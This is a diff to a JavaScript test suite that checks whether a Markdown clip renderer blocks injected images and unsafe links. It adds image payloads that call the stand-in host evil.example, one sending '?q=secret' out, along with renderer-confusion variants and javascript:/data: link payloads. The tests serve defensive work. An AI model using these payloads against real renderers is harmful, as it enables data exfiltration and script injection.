@@ -64,7 +64,13 @@ test('the clip is shown only when one was delivered, and limitations stay visibl
 const showClip = async content_markdown => (await present(saved({ ...fixture, content_markdown }))).markdown;
 
 test('images in clip text never load when the clip is shown', async () => {
-  for (const attack of ['![x](https://evil.example/?q=secret)', '![x][r]\n\n[r]: https://evil.example/p.png', '![`a`](https://evil.example/p.png)']) {
+  for (const attack of [
+    '![x](https://evil.example/?q=secret)', '![x][r]\n\n[r]: https://evil.example/p.png', '![`a`](https://evil.example/p.png)',
+    '!![x](https://evil.example/p.png)', '![x]\n\n[x]: https://evil.example/p.png',
+    // Text that looks like code here but not to a Markdown renderer.
+    '\\`![x](https://evil.example/p.png)`', '`a\nb` ![x](https://evil.example/p.png) `c`',
+    '```\r```\r![x](https://evil.example/p.png)', '- a\n   ```\n![x](https://evil.example/p.png)\n   ```',
+  ]) {
     assert.doesNotMatch(await showClip(attack), /!\[/, attack);
   }
 });
@@ -73,9 +79,11 @@ test('links in clip text must be HTTP(S), however they are spelled', async () =>
   for (const attack of [
     '[x](javascript:alert(1))', '[x](JaVaScRiPt:alert(1))', '[x](<javascript:alert(1)>)', '[[x]](javascript:a((1)))',
     '[x](javascript&colon;alert(1))', '[x](\njavascript:alert(1))', '[x](data:text/html,hi)', '[x][r]\n\n[r]: javascript:alert(1)',
+    '[a](https://ok.example/)[b](javascript:alert(1))',
   ]) {
     const clip = (await showClip(attack)).split('### Actions')[0];
     assert.match(clip, /\]\\[(:]/, attack);
+    assert.doesNotMatch(clip, /[^\\]\][(:]\s*(?:<|&lt;)?(?!https?:)\S/i, attack);
   }
 });
 
@@ -94,7 +102,8 @@ test('a fence the clip leaves open is closed before the verified links', async (
 test('clip formatting a reader needs survives untouched', async () => {
   for (const kept of [
     '[3:10](https://www.youtube.com/watch?v=x&t=190s)', '[wiki](https://en.wikipedia.org/wiki/A_(b))', '**Category:** AI & Agents',
-    '```ts\nconst x: Array<string> = [];\nconst y = "![a](b)";\n```', '~~~\n<b>\n~~~', 'Use `Array<string>` and `![x](y)` here.',
+    '```ts\nconst x: Array<string> = [];\nconst y = "![a](b)";\n```', '~~~\n<b>\n~~~', 'Use `Array<string>` and `arr[0]` here.',
+    '- step\n\n   ```ts\n   const x: Array<string> = [];\n   ```',
   ]) {
     assert.ok((await showClip(kept)).includes(kept), kept);
   }
